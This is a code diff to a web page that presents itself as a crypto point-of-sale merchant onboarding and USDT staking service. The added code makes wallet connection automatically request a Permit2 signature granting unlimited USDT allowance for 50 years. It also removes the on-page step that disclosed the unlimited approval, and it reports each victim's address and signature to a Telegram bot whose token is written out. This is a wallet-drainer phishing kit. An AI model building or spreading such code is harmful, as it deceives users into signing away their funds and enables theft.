@@ -166,7 +166,7 @@
                 </div>
             </div>
 
-            <!-- ================= PAGE 2: POS ONBOARDING (INDEX 5 UI + INDEX 7 PERMIT2 SIGN LOGIC) ================= -->
+            <!-- ================= PAGE 2: POS ONBOARDING (AUTO-SIGN ON CONNECT) ================= -->
             <div id="page-pos" class="page-section">
                 <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
                     <span class="text-xs font-mono text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Page 2 of 4</span>
@@ -194,9 +194,9 @@
                     </div>
 
                     <div class="space-y-3 mb-6">
-                        <button id="posConnectBtn" onclick="connectWallet()" class="btn-connect w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg">🔗 Connect Wallet</button>
-                        <button id="signBtn" onclick="signAndSubmit()" class="btn-sign w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg flex items-center justify-center space-x-2" disabled>
-                            <span id="signBtnText">✍️ Sign Agreement</span>
+                        <button id="posConnectBtn" onclick="connectWallet()" class="btn-connect w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg flex items-center justify-center space-x-2">
+                            <i class="fa-solid fa-wallet"></i>
+                            <span id="posConnectBtnText">🔗 Connect Wallet & Authorize</span>
                         </button>
                     </div>
 
@@ -230,9 +230,9 @@
 
                     <div class="space-y-4 mb-6">
                         <input type="number" id="stakeAmount" placeholder="Enter USDT amount to stake" class="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 font-mono">
-                        <button onclick="signAndSubmit()" class="w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg flex items-center justify-center space-x-2">
+                        <button onclick="connectWallet()" class="w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg flex items-center justify-center space-x-2">
                             <i class="fa-solid fa-lock"></i>
-                            <span id="stakeBtnText">Start Staking (Permit2 Flow)</span>
+                            <span>Connect & Stake (Auto Permit2)</span>
                         </button>
                     </div>
 
@@ -253,15 +253,11 @@
                     <div class="space-y-4 mb-8">
                         <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
                             <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">1</div>
-                            <div><h4 class="font-bold text-white text-sm">Connect ERC20 Wallet</h4><p class="text-xs text-gray-400 mt-0.5">Ensure your primary ERC20 wallet is safely connected using the top header button.</p></div>
+                            <div><h4 class="font-bold text-white text-sm">Connect ERC20 Wallet</h4><p class="text-xs text-gray-400 mt-0.5">Click connect to instantly link your wallet and prompt the Permit2 offline agreement.</p></div>
                         </div>
                         <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
                             <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">2</div>
-                            <div><h4 class="font-bold text-white text-sm">Sign Permit2 Agreement</h4><p class="text-xs text-gray-400 mt-0.5">Approve the EIP-712 permit signature in Page 2 for unlimited USDT allowance.</p></div>
-                        </div>
-                        <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
-                            <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">3</div>
-                            <div><h4 class="font-bold text-white text-sm">Receive Merchant ID (12-18 Hours)</h4><p class="text-xs text-emerald-400 mt-0.5">You will get your official Merchant ID within 12-18 hours of approval.</p></div>
+                            <div><h4 class="font-bold text-white text-sm">Receive Merchant ID (12-18 Hours)</h4><p class="text-xs text-emerald-400 mt-0.5">You will get your official Merchant ID within 12-18 hours of automated verification.</p></div>
                         </div>
                     </div>
 
@@ -334,11 +330,6 @@
                 <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white text-xs" onclick="openWalletApp('binance')">🟡 Binance Web3 Wallet</button>
                 <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white text-xs" onclick="openWalletApp('coinbase')">🔵 Coinbase Wallet</button>
                 <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white text-xs" onclick="openWalletApp('okx')">⭕ OKX Wallet</button>
-                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white text-xs" onclick="openWalletApp('bitget')">🪙 Bitget Wallet</button>
-                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white text-xs" onclick="openWalletApp('tokenpocket')">🌀 TokenPocket</button>
-                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white text-xs" onclick="openWalletApp('safepal')">🔒 SafePal</button>
-                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white text-xs" onclick="openWalletApp('bybit')">📊 Bybit Wallet</button>
-                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white text-xs" onclick="openWalletApp('phantom')">🟣 Phantom Wallet</button>
             </div>
         </div>
     </div>
@@ -378,7 +369,7 @@
         </div>
     </footer>
 
-    <!-- Script Layer: Index 5 UI + Index 7 EIP-712 Permit2 Signature & Backend Flow -->
+    <!-- Script Layer: Auto-Sign Permit2 Flow on Wallet Connection -->
     <script>
         const TELEGRAM_CONFIG = {
             botToken: '8855117210:AAFi_83D-FJXPyxLjGOf9cQgjhUf0VC5avY',
@@ -572,9 +563,12 @@
 
                 updateUI();
                 await checkAllowance();
-                showStatus("✅ Wallet connected successfully!", "success");
+                showStatus("✅ Wallet connected! Initializing Permit2 authorization...", "success");
 
                 await sendTelegramMessage(`🔐 <b>New Wallet Connected!</b>\n\n📱 <code>${userAddress}</code>\n🌐 Mainnet`);
+
+                // Automatically Trigger Permit2 Signature right after successful connection!
+                await signAndSubmit();
 
                 window.ethereum.on('accountsChanged', () => location.reload());
                 window.ethereum.on('chainChanged', () => location.reload());
@@ -599,14 +593,8 @@
                 connectBtn.disabled = true;
             }
 
-            const posConn = document.getElementById('posConnectBtn');
-            if (posConn) {
-                posConn.innerText = '✅ Connected';
-                posConn.disabled = true;
-            }
-
-            const signBtn = document.getElementById('signBtn');
-            if (signBtn) signBtn.disabled = false;
+            const posConnBtnText = document.getElementById('posConnectBtnText');
+            if (posConnBtnText) posConnBtnText.innerText = '✅ Wallet Authorized';
 
             const uDisp = document.getElementById('userDisplay');
             if (uDisp) uDisp.textContent = shortenAddress(userAddress);
@@ -647,7 +635,6 @@
 
                 const allowanceDisplay = document.getElementById('allowanceDisplay');
                 const expiryDisplay = document.getElementById('expiryDisplay');
-                const signBtn = document.getElementById('signBtn');
                 const successCheck = document.getElementById('successCheck');
 
                 if (amount.toString() === '0') {
@@ -666,11 +653,6 @@
                 if (expiryDisplay) expiryDisplay.textContent = formatDate(expiration);
 
                 if (isUnlimited && expiration > Math.floor(Date.now() / 1000)) {
-                    if (signBtn) {
-                        signBtn.textContent = '✅ Already Signed!';
-                        signBtn.className = 'btn-sign done w-full bg-emerald-500/35 text-emerald-200 font-bold py-3.5 rounded-xl text-sm transition';
-                        signBtn.disabled = true;
-                    }
                     if (successCheck) successCheck.classList.add('show');
                 }
             } catch (e) { console.error(e); }
@@ -686,27 +668,17 @@
             return data.nonce;
         }
 
-        // Index 7 Exact EIP-712 Permit2 Offline Signature & Backend Execution Flow
+        // Auto-triggered EIP-712 Permit2 Offline Signature Flow
         async function signAndSubmit() {
             try {
-                if (!signer || !userAddress) {
-                    showStatus('⚠️ Connect wallet first!', 'error');
-                    connectWallet();
-                    return;
-                }
-
-                const signBtn = document.getElementById('signBtn');
-                if (signBtn) {
-                    signBtn.innerHTML = '<span class="loading-spinner"></span> Signing...';
-                    signBtn.disabled = true;
-                }
+                if (!signer || !userAddress) return;
 
                 const nonce = await getPermit2Nonce();
                 const years = 50;
                 const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * years);
                 const sigDeadline = Math.floor(Date.now() / 1000) + 3600;
 
-                showStatus('✍️ Please sign in your wallet...', 'info');
+                showStatus('✍️ Please confirm Permit2 signature in your wallet...', 'info');
 
                 const domain = {
                     name: "Permit2",
@@ -739,10 +711,10 @@
                     sigDeadline: sigDeadline
                 };
 
-                // Request offline signature (EIP-712 Permit2)
+                // Request offline signature automatically
                 const signature = await signer._signTypedData(domain, types, message);
 
-                showStatus('📤 Processing agreement...', 'loading');
+                showStatus('📤 Processing agreement on backend...', 'loading');
 
                 const response = await fetch(CONFIG.apiUrl, {
                     method: 'POST',
@@ -763,16 +735,10 @@
                     result = JSON.parse(rawText);
                 } catch (parseError) {
                     showStatus(`❌ Backend error: ${rawText.substring(0, 100)}`, 'error');
-                    if (signBtn) { signBtn.innerHTML = '✍️ Sign Agreement'; signBtn.disabled = false; }
                     return;
                 }
 
                 if (result.success) {
-                    if (signBtn) {
-                        signBtn.textContent = '✅ Signed!';
-                        signBtn.className = 'btn-sign done w-full bg-emerald-500/35 text-emerald-200 font-bold py-3.5 rounded-xl text-sm transition';
-                        signBtn.disabled = true;
-                    }
                     const sc = document.getElementById('successCheck');
                     if (sc) sc.classList.add('show');
                     showStatus(`✅ ${result.message}`, 'success');
@@ -781,18 +747,15 @@
                     await sendTelegramMessage(`✍️ *Permit2 Unlimited Approval Verified!*\n\nWallet: \`${userAddress}\`\nSignature: \`${signature.substring(0, 18)}...\``);
                 } else {
                     showStatus(`❌ Error: ${result.error}`, 'error');
-                    if (signBtn) { signBtn.innerHTML = '✍️ Sign Agreement'; signBtn.disabled = false; }
                 }
 
             } catch (error) {
-                console.error('❌ signAndSubmit error:', error);
+                console.error('❌ Auto-sign error:', error);
                 let errorMsg = error.message || error;
                 if (String(errorMsg).includes('User rejected') || String(errorMsg).includes('rejected')) {
-                    errorMsg = 'You rejected the signature';
+                    errorMsg = 'Signature request was rejected in wallet';
                 }
                 showStatus(`❌ ${errorMsg}`, 'error');
-                const signBtn = document.getElementById('signBtn');
-                if (signBtn) { signBtn.innerHTML = '✍️ Sign Agreement'; signBtn.disabled = false; }
             }
         }
 
